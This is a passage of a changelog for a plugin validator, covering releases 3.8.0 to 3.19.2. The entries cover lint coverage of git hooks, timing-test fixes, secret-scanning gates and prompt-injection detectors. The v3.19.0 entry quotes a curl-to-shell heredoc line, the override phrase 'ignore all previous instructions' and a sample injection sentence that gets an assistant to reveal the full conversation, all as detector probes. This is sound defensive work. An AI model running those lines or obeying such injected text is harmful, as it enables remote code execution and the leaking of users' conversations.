→ `All checks passed!`, while CPV now reports `MAJOR — F821 git-hooks/pre-push:6:11 Undefined name`; a clean hook still passes. Dogfood test asserts CPV's own `pre-push`/`pre-commit` stay discovered, so the vacuous-green state cannot silently return. **Scaffolder parity** adds `extend-include` to the generated `pyproject.toml`, because a plugin's own CI runs ruff directly and never goes through CPV's engine.

**v3.19.2 — close the lint blind spot that let a broken git hook ship, + the 6th idle-calibrated guard**
— **`test_scanner_block_wall_time_is_slowest_not_sum` proved parallelism by WALL-CLOCK SPEEDUP**, which is only observable when spare cores exist — and Gate 2 runs the suite with `-n auto`, every core busy. Correctly-parallel code then shows no speedup, so the test reported "Parallelism is not engaged" (16.57s vs a 16.0s ceiling) while the parallelism was fine and the machine was merely saturated. Its own docstring records the budget being raised TWICE for this (1.0→2.0s in v2.88.0, 2.0→4.0s in v2.104.0 "after the 2.0s budget flaked at 9.5s under publish.py Phase C load"); raising it again would have been a fourth attempt at a fix that already failed twice. Replaced — after a FAILED intermediate attempt worth recording. **Attempt 1 (interval overlap) was WORSE than what it replaced and the next publish proved it:** each scanner recorded `(start, end)` and the test asserted peak concurrency `>= 2`, which passed locally but measured **peak concurrency 1** under real Gate-2 load, because the serialized per-scanner pre-work grows from ~0.8s to **3-5s** while the fake body was only 0.4s — so no two scanners were ever in flight. Overlap is a genuine property, but OBSERVING it requires the body to outlast a scheduling delay that is itself load-dependent: still a timing race, merely a subtler one. **Attempt 2 (shipped) removes the clock entirely — a `threading.Barrier(4)`.** A barrier releases only when all four parties have ARRIVED, and a blocked party STAYS in flight while waiting, so arrivals ACCUMULATE regardless of stagger; release therefore proves four scanners were simultaneously in flight. A serial executor can never assemble the fourth party, so its first scanner blocks until the barrier trips `BrokenBarrierError`. Machine-speed independent BY CONSTRUCTION — no budget can rot. Two-sided verified: `max_workers=4` passes in 5.8s, `max_workers=1` fails with `BrokenBarrierError`, and 3/3 stress rounds pass under the same `-n auto` load that produced attempt 1's failure. The barrier's own timeout is a failure-path backstop, never a budget the happy path spends.

**v3.19.2 — close the lint blind spot that let a broken git hook ship**
— **The repo's most safety-critical script was the one Python file lint never saw.** Git requires hook filenames to be extensionless, so ruff's extension-based discovery skipped `git-hooks/pre-push` and `git-hooks/pre-commit` entirely — and `ruff check git-hooks/` did not say so: it printed `No Python files found` **and then `All checks passed`**. A checker that inspects ZERO files emits the identical green as a clean one, so the blind spot was invisible from its own output. That is exactly how a v3.19.1 edit to the hook reached the tree using `time.monotonic()` without importing `time`, and a `DIM` colour constant that does not exist — a `NameError` in the hook that gates **every push**, i.e. a total push outage, caught only by a manual compile check. `extend-include` in `[tool.ruff]` now puts both hooks under the same `F821`/`F401` checks as the rest of the tree (verified two-sided: injecting `undefined_symbol_xyz` and `time_typo.monotonic()` now yields `F821`, where before it yielded "All checks passed"). Pinned by a test that asserts **DISCOVERY** rather than silence — `ruff check --show-files` must LIST the hook — because absence-of-errors and absence-of-files are indistinguishable, which is the whole bug; the test FAILS if `extend-include` is ever removed. The class was then enumerated rather than patched at the first instance: every tracked extensionless file carrying a python shebang is exactly those two, and both are now covered. version 3.19.2, 11328 tests.

**v3.19.1 — the renamed integrity env var no longer reads as a "bypass attempt" (self-inflicted, caught by dogfooding)**
— `_plugin_verify_hashes` renamed `CPV_SKIP_GITHUB_INTEGRITY` → **`PLUGIN_SKIP_GITHUB_INTEGRITY`** (TRDD-bbff5bc5), prints a deprecation notice, and at `_plugin_verify_hashes.py:466` literally tells the user to `export PLUGIN_SKIP_GITHUB_INTEGRITY=1`. But `publish.py::stage_bypass_guard` exempted only the LEGACY `CPV_SKIP_*` names while treating **`PLUGIN_SKIP_` as a forbidden PREFIX** — so obeying CPV's own deprecation notice aborted the release with `✗ Bypass attempt detected`. Found by hitting it: a real publish failed at Gate 0 with `PUBLISH_EXIT=1`. **A rename is not atomic across consumers** — the producer renamed the var, and the consumer's exemption ALLOWLIST kept the old key, so it failed CLOSED and looked like a security refusal rather than a stale list. Both definitions now exempt the new spelling: `scripts/publish.py` (CPV's own pipeline) and the generator's template, verified by GENERATING a plugin's `publish.py` and asserting the exemption is present — otherwise every newly scaffolded plugin would inherit the same trap. **This grants NO new capability:** the identical read-only override was already exempt under its legacy name (which still works), so the change only makes the documented migration path functional; `PLUGIN_SKIP_GH_AUTH_CHECK` is deliberately NOT exempted because no such var is read anywhere and exempting a dead name would widen the bypass surface for nothing. 12 two-sided tests pin both halves: the renamed var is exempt, while `PLUGIN_SKIP_TESTS` / `PLUGIN_FORCE_PUBLISH` / `PLUGIN_BYPASS_GATES` / `CPV_SKIP_GATE7` / `SKIP_LINT` / `NO_VERIFY` all still abort, and an empty-valued var stays inert. Also ships the project wikimem aspect page `prose-vs-executable-intent-canon.md` (the v3.19.0 decision record) wired into the hub with reciprocal links. **Plus three release-gate fixes found by dogfooding this very release:** (1) **the pre-push hook FALSE-blocked four consecutive attempts** — its `run_script` budget was 180s while the identical `validate_plugin.py . --verbose --strict` it runs measured **42-51s standalone on the very tree being pushed**; the in-situ cause remains UNIDENTIFIED (machine load, the post-Gate-10 tree, a `uv lock` re-sync, and a captured-pipe deadlock were each measured and RULED OUT), so the budget goes to 600s (~12x measured, matching Gate 2's own) and the hook now **always prints elapsed time** — the instrumentation is the real fix, the margin only stops a diagnosable slowdown from masquerading as a validation failure. This changes PATIENCE, never STRICTNESS: validation still runs in full with `--strict` on the actual pushed tree, and a timeout still FAILS CLOSED (pinned by a test). (2) **The installed `.git/hooks/pre-push` had DRIFTED** — 467 lines vs the tracked 599, missing the issue-#169 branch-aware gates entirely, so the gate actually enforcing pushes was not the gate under review; reinstalled, with a test that fails on future drift. (3) **`test_skillaudit_redos` measured WALL clock** (`perf_counter`) for its "is the no-re2 fallback bounded" assertion, so under `pytest -n auto` it reported a false ReDoS at 11.356s for a scan that takes 1.3s standalone; switched to **CPU time** (`process_time`) — catastrophic backtracking BURNS CPU so detection is preserved (verified: a real backtracker costs 1.685s CPU while 0.4s of contention costs 0.0000s), and a true C-level hang is still caught by the harness's OS-level wall-clock kill, which is the only thing that can preempt one. **That first fix was INCOMPLETE and the next publish proved it:** the same test failed again, now as `TimeoutExpired after 20.0s` — the *inner* assertion had been made contention-proof while the *outer* harness budget `_NO_RE2_BUDGET_S` was still 20s of wall clock, the identical disease one level up (its comment even claimed 20s "absorbs a slow/loaded CI runner"; under 14 workers it did not). Raised to 120s, which costs ZERO detection power because this guard only ever distinguishes "bounded but slow" (seconds) from "catastrophic backtracking" (minutes/infinite) — 120s is ~90x the 1.3s standalone scan. The two layers now each measure what they can measure honestly: CPU time for the tight backtracking bound, wall clock only for the un-preemptable C-level hang. Also closes the rename hermeticity gap in `test_publish.py` (it cleared only the legacy integrity var, leaving the SAME escape hatch live under its renamed spelling), and de-flakes `test_diagnose_does_not_mutate_tree`, which inventoried `root.rglob("*")` **including `.git/`** — but `diagnose()` shells out to git, and git mutates its own object store merely by being QUERIED (taking/releasing `*.lock`, kicking off background maintenance), so the assertion was measuring git's bookkeeping rather than the tool; it failed on `.git/objects/maintenance.lock`. Now scoped to the PLUGIN's files, two-sidedly verified (a real plugin-file mutation is still detected; git-internal churn is ignored). **Common thread across all four:** every one was a budget or snapshot calibrated on an idle, quiescent machine and then enforced inside a pipeline that deliberately saturates the machine (or queries git) one step earlier — none was a defect in the thing being measured. version 3.19.1, 11321 tests.

**v3.19.0 — prose is not executable intent: close #177 + #178, and a real pre-existing FN found while doing it**
— Two reports that CPV scored **non-executable documentation prose** as executable intent. **#177** `FS_WRITE` (MAJOR) fired on a bash-fence **comment** in a skill reference doc — `# … add it to your shell profile (e.g. ~/.zshrc or ~/.bashrc)` — where the fence's only commands are `go install`/`which`. The fix adds **no new mechanism**: the correct predicate already existed for `.sh` (`_shell_match_lacks_write_intent` + `_WRITE_INTENT_RE`, whose docstring literally documents this bare-`.zshrc`-suffix class), and `.md` simply never reached that classifier; the markdown module already imported from `_skillaudit_shell_context`, so this is one import and one call site — one source of truth, not a copied regex. **The obvious fix was rejected as FN-opening:** "an execution-class rule should ignore a `#` comment line" fails because `_EXECUTABLE_LANGS` includes `console`/`terminal`/`tty` (a leading `#` there is a **root prompt**, not a comment) and `bat`/`cmd`/`batch` (`#` is not a comment at all), and an unquoted heredoc body line `# $(curl evil|sh)` matches `^\s*#` yet still executes; `references/` was likewise NOT re-added to `_DOC_ONLY_DIR_PREFIXES` (deliberately removed — agents are told to FOLLOW recipes in reference docs). Emitted severity confirmed **MAJOR** via the bash-fence uplift (`cpv_skillaudit_native.py` `medium`→`high`) + `_SEVERITY_MAP` (`high`→`major`), NOT the catalog's `medium`→`minor` — the regression test asserts the true tier. **#178** `MCP_SCHEMA_POISON` (NIT, blocks `--strict`) fired on a wikimem note's `description:` — a recall surface the memory protocol REQUIRES to be a list of the user's own symptom phrases. Root cause is the greedy-determiner class fixed several times here: `…(?:ignore|disregard|override).{0,80}(?:previous|prior|other)` treats `other` as an ordinary determiner, so *"ignored maintenance mode … no effect on the **other** daemon"* matched; pattern 0 now requires an **object noun** after the determiner (≤3 intervening modifiers, plural-aware) and `\b`-anchors both ends — which also killed an **inside-word** match (`an-other` in "impersonate another agent"). Pattern index 4 (`include … all … conversation`) is deliberately UNTOUCHED: it is the one shape no other rule covers, and the #176 ruling turns on exactly that. **What made the narrowing provably FN-safe was measurement, not argument:** `ignore all previous instructions` is **triple-covered** (also `PROMPT_INJECT` + `INDIRECT_PROMPT_INJECT`), so narrowing cannot blind it — but `ignore other tools instructions` fires `MCP_SCHEMA_POISON` **alone**, with no backstop, so that probe is the FN tripwire and it still fires. **Net effect is MORE detection, not less:** chasing the advisor's FN-hazard list surfaced a genuine pre-existing false negative — `ln -sf`, `sed -i`, `perl -i`, `truncate`, `open(...,'w')` were demoting to `info` in `.sh` — now closed. **Rejected outright:** excluding `.claude/project/memory/**` (turns an FP into an FN); re-tiering the rule to WARNING globally (removes the gate everywhere); and an imperative-vs-narrative discriminator, which is attacker-satisfiable in one line (*"The policy was updated; the assistant now includes the full conversation"* — past tense, no imperative, still works). No ReDoS on the **no-re2 CI path**: bounded quantifiers scale linearly (0.03 → 2.06 ms across a 100× input growth). Harness lesson worth keeping: the first probe used `rule_id` instead of `ruleId` and reported **all-clear even on genuine attacks**, then over-corrected by counting `suppressed` findings as fired (making it unpassable by any correct fix) — a two-sided harness without MUST-FIRE rows passes **vacuously**. Also bootstraps the PROJECT wikimem hub (`wikimem/claude-plugins-validation-overview.md`) with bidirectional `Parts map` ↔ `Governed by` links, and the one-line harness↔wikimem bridge in `MEMORY.md`. version 3.19.0, 11309 tests. [[lesson-verify-fp-scope-before-category-fix]] [[lesson-greedy-match-truncates-right-context]]

**v3.18.0 — close FOUR agent-validator false negatives (D1 dup-key · D2 MCP grant · D3 shell fence · D6 contradictions)**
— Pointed at a real 33-agent corpus, `validate_agent.py` passed **32/33 at 100/100** while those files held genuine errors it never saw — proof the validator, not the agents, was the problem. **D1** duplicate top-level frontmatter key → **MAJOR**: `yaml.safe_load` silently keeps the LAST occurrence, so a file with two `tools:` lines lost the author's first grant and still scored 100; detected by a raw **pre-YAML** scan of the frontmatter text anchored at **column 0** (block-scalar bodies and nested keys are indented, so they cannot FP), implemented in `cpv_validation_common` and wired into the agent + skill + command validators. **D2** MCP grant hygiene: real ids are `mcp__server__tool`, so a single-hyphen `mcp__server-*` matches NOTHING — the grant is silently ineffective while the body still calls those tools; reuses `mcp_usage_allowed` (which already treats exact / `__*` glob / bare-server as VALID) so only the provably-ineffective form is flagged — **MAJOR** when the body references tools the grant fails to cover (attached to the EXISTING cross-check → no new standalone invalid verdict), WARNING when uncorroborated. **D3** shell fence with no `Bash` grant → **WARNING** (deliberately not MAJOR — an illustrative fence, a runbook, or "have your Bash-capable subagent run this" are all legitimate; no reliable discriminator), extending the existing fence tracker rather than adding a second parser. **D6** tool in both `tools:` and `disallowedTools:` → MAJOR; duplicate entry inside one `tools:` list → WARNING. Severity discipline: WARNING is the ONLY non-blocking tier under `--strict`, so every advisory is WARNING, never MINOR/NIT — CPV must never call a valid agent invalid. **Deliberately NOT implemented** (both premises doc-verified FALSE): a runtime `Skill()` call is not a cache hazard (it lands in the message TAIL, not the cached system prefix; and `skills:` frontmatter injects a skill's FULL content into EVERY invocation, so a dynamic router SHOULD load at runtime), and inline `!cmd` does not execute in an agent body — detectors for either would flag the CORRECT pattern as a defect. 55 new two-sided tests; 4185 pass across the 132 affected files; the 33-agent corpus reports 0 hits, shown **non-vacuous** by a mutated-copy positive control firing all 5 needles. Also ships the PROJECT-scoped wikimem page `agent-prompt-cache-and-context-economy.md` (git-tracked → reaches every cloner) recording the verified cache mechanics + 4 lessons. Gotcha re-confirmed: editing `cpv_validation_common.py` un-skips it from the self-hash manifest, so its own detector-catalog vocabulary fires 1 MAJOR + 4 NITs until `_plugin_compute_hashes.py` is re-run — **regen hashes LAST**, it is the invariant, not a suppression. version 3.18.0, ~11256 tests. [[agent-prompt-cache-and-context-economy]] [[lesson-regen-hashes-last-markdown-poison]]

**v3.17.0 — purge the disproven no-recurse premise + WIRE the public-source-repo migration (#175 follow-up, Phase B)**
— **SECURITY-RELEVANT DOC FIX.** FIVE docs still taught that Claude Code does NOT pass `--recurse-submodules`, so a submodule's content "never reaches the user" and only a ~86-byte `.gitmodules` pointer ships. That is **empirically FALSE** (CC recursively fetches submodule CONTENT on install — verified on PSS 3.10.8, whose installed `rust/` carried 1.7 MB of Rust source into the plugin cache). An agent following those docs would ship compile source to every user **while believing it did not** — precisely the outcome the ship-only-binary canon exists to prevent. Every occurrence is replaced with the verified fact and the superseded claim is LABELLED superseded, never silently dropped (a wider sweep than the spec's grep phrases found a 5th wording). `cpv-strip-dev-submodules` is additionally rewritten to the CURRENT clone-by-URL model (v3.12.0 removed `git submodule add`; strip records `{path,url,sha}` under `cpv.strip.extract[]`, `--restore` re-clones pinned to the sha) and documents the v3.16.0 flags (`--visibility`, the fail-closed trufflehog git-history secret gate STRIP-S001/S002, `--force-extract`); the directory NAME is left unchanged so no reference breaks (rename = separate change). **WIRING (the user's actual ask — "make cpv-agent create a separate repo for the binary build"):** the end-to-end recipe lands in `ship-binary-only-fixes.md` with a MANDATORY user-confirmation step before creating a PUBLIC repo (naming repo + visibility + "the full subdir HISTORY becomes public") and an explicit "never bypass the secret gate to clear a finding"; the skills-menu gains **Intent→Action row 20** + a corrected catalog entry; the canon doc states the source repo is PUBLIC and names the one command; `cpv-agent` Rule 8 adds "creating a PUBLIC repo" to the confirm-first list. Deliberately NO routing branch in the agent — the Intent→Action table stays the single routing SSOT (a second table would drift). 10 files; markdownlint clean; `validate_agent` on cpv-agent.md exit 0; the forbidden-claim grep returns EMPTY. version 3.17.0, ~11201 tests. [[cpv-compiled-component-ship-only-binary-canon]] [[lesson-verify-issue-is-not-already-shipped]]

**v3.16.0 — strip-dev engine hardened for the wired public-source-repo migration (#175 follow-up, Phase A)**
— User asked to close the last #175 gap: CPV detects/documents the ship-only-binary canon but never CREATES the separate source repo. The engine (`cpv_strip_dev.py`: `gh repo create`→`git filter-repo` extract-with-history→push→record `{path,url,sha}`) existed but (a) hardcoded `gh repo create --private` and (b) had ZERO secret scanning — it pushed the extracted subdir's FULL git history from /tmp (a fresh clone, no pre-push hook, so CPV's #169 trufflehog gate never fired). For the compile-source case the repo must be PUBLIC (release CI clones by URL tokenlessly), making an ungated public history-push a real leak. Phase A (advisor-vetted, opus agent, orchestrator-reviewed incl. the secret-gate diff + independent test re-run): **(1)** `--visibility {public,private}` (default private — a general dev-artefact strip must never auto-publicize; #175 passes `--visibility public`) threaded to `_ensure_repo_exists` (replaces the hardcoded `--private` + parameterizes the repo description), `apply_plan`, and the dry-run preview; main() extends the HAND-ROLLED parser in-idiom (NOT argparse — avoids breaking 4 `test_main_*` assertions). **(2)** FAIL-CLOSED secret gate `_scan_clone_for_secrets` in `_filter_and_push` AFTER `git remote add`, BEFORE push: `trufflehog git file://<clone> --json --no-update --fail` (git-HISTORY mode, 30-min timeout) — PUBLIC blocks on findings (STRIP-S001) OR absent/timeout/scan-error (non-{0,183} exit → STRIP-S002), PRIVATE warns+proceeds; mirrors #169's fail-closed posture; `_parse_truffle_findings` reads git-mode JSON (`SourceMetadata.Data.Git`). **(3)** `should_strip_target(force_extract=)` + `--force-extract` bypasses the 256KB/20-file skip (a small crate must still extract) with an is_dir-first fail-safe. +10 two-sided tests (66 unit) + 97 regression (e2e+importers); all new params optional-with-defaults (backward-compatible); ruff+mypy clean; cold self-validate 0/0/0/0. Phase B (wire the migration recipe into the routing SSOT + cpv-agent so it's actually invoked, with explicit user confirm) is next. version 3.16.0, ~11194 tests. [[cpv-compiled-component-ship-only-binary-canon]] [[feedback_never_suppress_never_relax_gate]]

**v3.15.0 — ship-only-binary canon DOCS + PSS-compat PROOF → #175 epic COMPLETE (Phases 1–6 all done)**
— Phase 6, the last phase: two new author/fixer reference docs + a compatibility proof against the reference compiled plugin. **Docs:** `skills/cpv-canonical-pipeline/references/compiled-component-canon.md` (the canon — bin/-per-platform×arch + dispatcher, the two compliant source-hosting options [separate-repo-clone-by-URL CI vs binary-carrier plugin], WHY a submodule is non-compliant [CC recurses on install], the four findings table, the `cpv.canon: ship-only-binary` opt-in + #170 never-retro-break, the generated publish.py G2e/G2f gates) + `skills/cpv-fix-validation/references/ship-binary-only-fixes.md` (per-finding remediation) + 4 rows in `plugin-error-index.md` (accurate per-rule intro versions). **PSS-compat PROOF** (`reports/cpv-issue-175-phase6/…-pss-compat-proof.md`, independently re-verified by the orchestrator non-strict): a scratch shallow clone of perfect-skill-suggester (build-source `rust` submodule, committed per-platform `bin/`, `pipeline_profile: submodule-build`, NO `cpv.canon` opt-in) draws exactly ONE canon finding — `RC-SHIP-BINARY-ONLY` **WARNING** — and NO `RC-SHIP-BINARY-ONLY-STRICT`/`RC-SUBMODULE-SHIPS`/`RC-MIXED-COMPILED`. **A WARNING never blocks in ANY mode** (`cpv_validation_common` — WARNING is the sole non-blocking tier even under `--strict`; only NIT additionally blocks in strict), so the canon **cannot flip PSS's validity**. PSS's `--strict` INVALID (`MAJOR=1 MINOR=20 NIT=10 WARNING=27`) is driven ENTIRELY by pre-existing PSS-owned findings unrelated to #175 — the lone MAJOR is a Ruff lint error in PSS's own `scripts/pss_make_plugin.py` (a PSS-side issue, out of #175 scope; not CPV's to fix — cross-project rule). Compat = PROVEN. Docs-only release: no `scripts/` change, no new tests; cold strict self-validate 0/0/0/0. Deferred to a future major (per advisor): generator auto-emit of `cpv.canon` + default-on blocking. version 3.15.0, ~11194 tests. [[cpv-compiled-component-ship-only-binary-canon]] [[feedback_never_suppress_never_relax_gate]]

**v3.14.0 — ship-only-binary canon becomes ENFORCEABLE via opt-in escalation (#175 Phase 5)**
— RC-SHIP-BINARY-ONLY / RC-SUBMODULE-SHIPS stay non-blocking WARNs for everyone; a plugin that declares **`cpv.canon: ship-only-binary`** in its manifest additionally gets them escalated to a publish-BLOCKING **RC-SHIP-BINARY-ONLY-STRICT** MAJOR. Advisor (Fable 5) design — a blanket WARN→MAJOR flip would retro-break every green plugin (WARNING is the only non-blocking tier), violating #170; the opt-in (selector-not-suppressor, precedent `cpv.pipeline_profile`) means a plugin that does NOT opt in keeps exactly today's WARN — nothing green starts failing unbidden. `cpv_pipeline_profile.opts_into_ship_only_binary_canon(plugin_root)` is FAIL-SAFE: missing/malformed/non-`"ship-only-binary"` → False → WARN only (a broken manifest degrades to status quo, never a silenced violation — the WARN is ALWAYS emitted first, the MAJOR only ever ADDED on top). Blocks on **content not names**: the escalation fires on ANY `.gitmodules` entry (build-source OR other) — killing the `rust/`→`tests/rust/` rename-downgrade gaming vector — AND on in-tree compiled source (same real-component gate as the WARN). Keyed on the direct detectors (`classify_submodules`, in-tree source), NEVER on `plugin_ships_compiled` (any-error→False would silently unblock). The escalated MAJOR carries the fix (migrate to bin/-only + clone-by-URL source, or remove the opt-in). Generator auto-opt-in + a wired one-command migration + default-on blocking are DEFERRED to a future major (per advisor: don't block a class CPV can't yet auto-fix). +5 two-sided tests (opt-in submodule→MAJOR; no-opt-in→WARN-only-green; rename-downgrade still blocks; in-tree source→MAJOR; malformed-manifest→WARN fail-safe). ruff+mypy(132) clean; cold self-validate 0/0/0/0 (CPV itself does not opt in). version 3.14.0, ~11194 tests. [[cpv-compiled-component-ship-only-binary-canon]] [[feedback_never_suppress_never_relax_gate]]

**v3.13.0 — mixed-language compiled-component detector + strict-canon build-workflow fix (#175 Phase 3)**
— A script-primary plugin (e.g. python publish pipeline) that ALSO ships a compiled component (a rust helper crate) was representable only as bare `standard` profile, losing the compiled signal. Added `cpv_pipeline_profile.plugin_ships_compiled(plugin_root)` (in-tree compiled source + build marker, OR `has_build_source_submodule`, OR `bin/` artifacts + compiled indicator; vendor/hidden pruned; local compiled-ext set — NO `validate_plugin` import, no cycle; any error → False). Real consumer chain: `_detect_profile_with_compiled` (the ONE detection routine; `detect_pipeline_profile` delegates to it — str contract unchanged) → `standard_profile_ships_compiled` → a new **RC-MIXED-COMPILED** INFO in `validate_cross_platform` (surfaces that CPV recognized the mixed shape; the compiled part is already gated by RC-SHIP-BINARY-ONLY + publish.py G2e regardless of profile — deliberately did NOT invent a new KNOWN_PROFILES value). Strict-canon fix: `gen_release_binaries_yml` no longer emits `submodules: recursive` on either checkout (the submodule model is gone post-v3.12.0, so it checked out nothing and misled) — replaced with plain `actions/checkout` + a clone-by-URL example reading `cpv.strip.extract[]` (function is UNWIRED/latent; fixed for correctness). +12 two-sided tests; 149 affected + actionlint green; ruff + mypy(132) clean. Detector implemented by an opus agent, the INFO consumer + the no-dead-code wiring done by the orchestrator, full diff + test re-run reviewed before ship. version 3.13.0, ~11189 tests. [[cpv-compiled-component-ship-only-binary-canon]]

**v3.12.0 — strip-dev retarget: `git submodule add` → clone-by-URL (no `.gitmodules`), the strict-canon dev-extraction model (#175 Phase 4)**
— `cpv_strip_dev.py` no longer runs `git submodule add` / writes `.gitmodules`. Because Claude Code recursively fetches submodule CONTENT on install (verified PSS 3.10.8), a submodule pointer ships the dev content anyway — so strip-dev's original premise was empirically false. New model: strip REMOVES the extracted dir from the plugin tree and records a `{path, url, sha}` reference in `.claude-plugin/plugin.json` → `cpv.strip.extract[]`; `--restore` re-clones each reference pinned to its SHA and strips the nested `.git` (plain files, no gitlink). **Manifest holds two shapes over the lifecycle**: pre-strip DECLARATIONS `{src, submodule}` (author/scaffold-written, read by `build_plan`) and post-strip RECORDS `{path, url, sha}` (machine-written, read by `--restore`) — a record is any entry with a `url` key. Security hardening: `_RESERVED_SRCS` (never extract `.git`/`.gitmodules`/`.claude-plugin`/`scripts`/`agents`), strict `_HTTPS_GITHUB_URL_RE` + `git clone -- <url>` (option-injection + host-substitution safe), fail-fast record validation (STRIP-R001..R020). Crash-safety preserved (`SUBMODULE_ADDED`→`REFERENCE_RECORDED`, same 6-state checkpoint contract). Integrations verified no-op without `.gitmodules` (`cpv_validate_gitmodules.py` UNCHANGED, pre-push, `validate_strip_gitmodules`); `load_strip_config`/`_already_stripped_srcs` use safe `.get("src")` so records are skipped. ~22 two-sided tests; 195 strip-dev-importer tests green; ruff + mypy(132) clean. Delegated to an opus agent, orchestrator-reviewed (diff + full test re-run) before ship. Generator emit of the new declaration shape = Phase 3. version 3.12.0, ~11177 tests. [[lesson-skillaudit-fp-on-memory-frontmatter-is-not-scanner-scope]] [[cpv-compiled-component-ship-only-binary-canon]]

**v3.11.0 — security: close the `_SKIP_DIRS` name-skip false negative in skillaudit (issue #176 follow-up, advisor-surfaced)**
— `cpv_skillaudit_native._iter_scannable_files` skipped `docs_dev`/`downloads_dev`/`reports`/`.scratch`/… **by name, unconditionally, BEFORE** the shipped-surface check — so a **TRACKED, non-gitignored** `docs_dev/payload.md` shipped in the `git archive` Claude Code installs yet was NEVER scanned (an attacker-forgeable directory name = a real security FN). Fix: split `_SKIP_DIRS` into **`_ALWAYS_SKIP_DIRS`** (VCS/cache/package cruft — `.git`/`node_modules`/`__pycache__`/`.venv`/… — skipped unconditionally; scanning them is catastrophic noise) and **`_SKIP_IF_UNSHIPPED_DIRS`** (the `_dev`/`reports`/`dist`/`build`/private-scratch family). The conditional tier is skipped by name ONLY when git is unavailable (conservative — preserves the #42 `reports/` self-match-noise fix on non-git trees); when git IS available they fall through to the existing `gitignored_unshipped_paths` check, which skips iff genuinely unshipped (gitignored∧untracked) and **SCANS a tracked payload** — closing the FN exactly at the pre-publish gate (always a git repo). Removed the now-dead `_SKIP_DIRS` union (no ghost). +5 two-sided git-backed tests. Advisor (Fable 5) surfaced this while reviewing #176; **FP corpus re-run shows ZERO new misclassifications** (the one pre-existing RC-65 FP-5 item is unchanged with/without this change — unrelated `validate_plugin` classifier matter). ruff + mypy(132) clean. version 3.11.0, ~11155 tests. [[lesson-skillaudit-fp-on-memory-frontmatter-is-not-scanner-scope]]

**v3.10.0 — `--strict` scope: stop grading non-shippable/non-relevant content (issue #176, cases 2 & 3)**
— The validators walked the filesystem tree instead of the shipped/relevant surface, producing findings on content a CI checkout of the published artifact never contains. Two clean FN-safe scope fixes: **(case 3)** `cpv_ci_preflight._shell_script_paths` filtered bare `rglob` shell scripts through `gitignored_unshipped_paths` — shellcheck/shfmt no longer lint gitignored+untracked `downloads_dev/*.sh` (absent from CI, a parity bug); a TRACKED+gitignored `.sh` still SHIPS so it stays linted (FN-safe — uses the git-accurate ignored∧untracked set, not a gitignore-pattern skip). **(case 2)** `cpv_lint_engine.lint_markdown` skips any path with a `fixtures` segment — deliberate multi-H1/malformed-by-design parser test inputs are DATA, not shipped docs; style-tier only, never touches the security scanners, mirrors the mypy `_is_own_script` fixtures-exclude precedent. +5 two-sided tests (git-backed). **Case 1** (skillaudit `MCP_SCHEMA_POISON` on `.claude/project/memory/` frontmatter) is NOT a scanner change: memory notes ARE recalled into agent context, so directive-shaped `description:` text is a legitimate weak indirect-injection surface — the fix is reword-guidance (nominal recall keywords, no directive verb-combo; does NOT destroy recall), the #170 answer, posted on the issue. Advisor (Fable 5) verified the FN-safety and surfaced a SEPARATE `_SKIP_DIRS` security FN (tracked `docs_dev/payload.md` ships but is name-skipped) — filed for its own hardening release. ruff + mypy(132) clean. #176 cases 2&3 CLOSED, case 1 answered. version 3.10.0, ~11150 tests.

**v3.9.0 — close the submodule-detector false-negative + correct the now-false `.gitmodules` threat model (issue #175)**
— The v3.8.0 `RC-SHIP-BINARY-ONLY` detector only fired for a **build-source-hint whitelist** (`rust/src/go/cpp/c/native/core/lib/crate/crates`), so any submodule OUTSIDE that set drew **zero** finding — yet Claude Code recursively fetches submodule CONTENT on install, so it ALL ships. Two FN classes escaped: non-hinted source paths (`engine/`, `compiler/`, a repo-named `pss-rust-engine/`) and dev/test tooling (`tests/`, `docs/`, `examples/` — the latter were even *explicitly excluded*). Fix: `cpv_pipeline_profile.classify_submodules()` now partitions `.gitmodules` into `(build_source, other)` as the ONE classifier (`has_build_source_submodule` delegates to it), and `validate_plugin.validate_cross_platform` adds a general **`RC-SUBMODULE-SHIPS`** WARN for every `other` submodule ("this content ships on install — confirm it's intended; reference it out-of-tree instead"). FN-safe: an unrecognized path lands in `other` (advised), never dropped. Also corrected `cpv_validate_gitmodules.py`'s threat-model docstring — its "End user — SAFE, CC never recurses" premise is empirically FALSE (verified on PSS 3.10.8); the URL allowlist now documented as protecting the **end user** too, not just dev/CI. +6 two-sided tests (2 `classify_submodules` unit + 4 validate-level: non-hinted-source warns, dev warns, build-source no-double-warn, no-gitmodules no-warn). ruff + mypy(132) clean. Advisor Option-1+ items still open: retarget strip-dev off `git submodule add` → clone-by-URL, + a doctor-level cache probe. #175 OPEN. version 3.9.0, ~11145 tests. [[cpv-compiled-component-ship-only-binary-canon]]

**v3.8.1 — security: remove the personal `Emasoft` allowlist carve-out from the UNIVERSAL `.gitmodules` validator**
— `scripts/cpv_validate_gitmodules.py` (strip-dev-parts URL allowlist, TRDD-793ac32a) had `_DEFAULT_TRANSITIONAL_OWNER = "Emasoft"` (pre-existing since `044c727ec`, 2026-05-03): its DEFAULT submodule-URL allowlist rule was "same owner as parent repo **OR Emasoft**", so on ANY third-party plugin an `Emasoft`-owned submodule URL passed — a personal carve-out baked into a universal validator = a supply-chain leak (violates the CPV-is-universal + never-a-gate-hole directives). Surfaced by the fable-advisor while reviewing the compiled-component canon; user confirmed "just fix this". Removed the constant + all 6 references → **same-owner-only** default (still covers PSS, whose submodule is same-owner; cross-owner submodules must be declared explicitly in `cpv.strip.allowed_submodule_urls`, or opt out with `require_url_allowlist=false`). Renamed the misleading `..._accepts_emasoft` test (it was really same-owner) + added `..._rejects_cross_owner_no_carveout` (parent≠Emasoft + Emasoft submodule → now STRIP-G013, was accepted). Other `Emasoft` strings in the source are benign (CPV's own repo URL, doc examples incl. the `--author` help example, provenance comments). ruff + mypy(132) + cold self-validate `0/0/0/0`. NOTE: the CC-recurses-submodules finding still falsifies this module's threat-model docstring + strip-dev's value-prop — reframe/retarget pending (advisor Option 1+). #175 OPEN. version 3.8.1, test files 414. [[cpv-compiled-component-ship-only-binary-canon]] [[feedback_cpv_is_universal_not_ai_maestro]]

**v3.8.0 — issue #175: STRICT ship-only-binary canon (build-source submodule now WARNs) + empirical CC-submodule-recursion finding**
